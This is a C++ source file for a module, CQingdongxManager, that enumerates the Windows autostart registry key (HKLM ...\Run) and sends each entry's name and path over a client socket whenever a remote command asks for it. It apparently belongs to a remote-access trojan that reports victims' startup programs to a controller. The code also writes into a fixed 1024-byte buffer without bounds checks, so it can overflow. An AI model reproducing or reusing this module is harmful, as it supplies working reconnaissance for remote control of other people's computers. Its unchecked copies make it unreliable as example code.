// QingdongxManager.cpp: implementation of the CWindowsManager class.
//
//////////////////////////////////////////////////////////////////////
#include "stdafx.h"
#include "QingdongxManager.h"

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CQingdongxManager::CQingdongxManager(CClientSocket *pClient) : CManager(pClient)
{
	getRunList();
    SendRunList();
}

CQingdongxManager::~CQingdongxManager()
{
	
}
void CQingdongxManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	
	switch (lpBuffer[0])
	{
	case COMMAND_RUN:
		SendRunList();
		break;
	default:
		return;
	}
}

void CQingdongxManager::SendRunList()
{
	UINT	nRet = -1;
	LPBYTE	lpBuffer = getRunList();
	if (lpBuffer == NULL)
		return;
	
	Send((LPBYTE)lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);
}

LPBYTE CQingdongxManager::getRunList()
{
	LPBYTE 	lpBuffer = NULL;
	DWORD	dwOffset = 1;
	DWORD   dwLength = 0;
	
	lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1024);
	if(lpBuffer == NULL)
		return NULL;
	
	lpBuffer[0] = TOKEN_RUN;
	HKEY hKey ; 
	HKEY hKey1; 
	LPCTSTR lpSubKey="SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\"; 
	LPCTSTR lpSubKey1="HKEY_LOCAL_MACHINE"; 
	if(RegOpenKeyEx(HKEY_LOCAL_MACHINE, lpSubKey, 0, KEY_READ, &hKey)!= ERROR_SUCCESS) 
	{ 
		return 0; 
	} 
	
	
#define NAME_LEN 200 
	char szValueName[NAME_LEN]; 
	BYTE szPortName[NAME_LEN]; 
	LONG status; 
	DWORD dwIndex = 0; 
	DWORD dwSizeValueName=200; 
	DWORD dwSizeofPortName=200; 
	DWORD Type; 
	dwSizeValueName = NAME_LEN; 
	dwSizeofPortName = NAME_LEN; 
	
	
    do 
	{ 
		status = RegEnumValue(hKey, dwIndex++, szValueName, &dwSizeValueName, NULL, &Type, 
			szPortName, &dwSizeofPortName); 
		if((status == ERROR_SUCCESS)) 
		{ 
			/*	m_lstPort.AddString((char *)szPortName); */
			memcpy(lpBuffer + dwOffset, (char *)szValueName, lstrlen((char *)szValueName) + 1);
			dwOffset += lstrlen((char *)szValueName) + 1; //这个是名称
			
			
			memcpy(lpBuffer + dwOffset, (char *)szPortName, lstrlen((char *)szPortName) + 1);
			dwOffset += lstrlen((char *)szPortName) + 1; //这个是路径
			
			memcpy(lpBuffer + dwOffset, (char *)lpSubKey1, lstrlen((char *)lpSubKey1) + 1);
			dwOffset += lstrlen((char *)lpSubKey1) + 1; //这个是路径
			
			
		} 
		dwSizeValueName = NAME_LEN; 
		dwSizeofPortName = NAME_LEN; 
	} while((status!= ERROR_NO_MORE_ITEMS)); 
	
	RegCloseKey(hKey); 
	
	lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset, LMEM_ZEROINIT|LMEM_MOVEABLE);	
	return lpBuffer;
	
	
}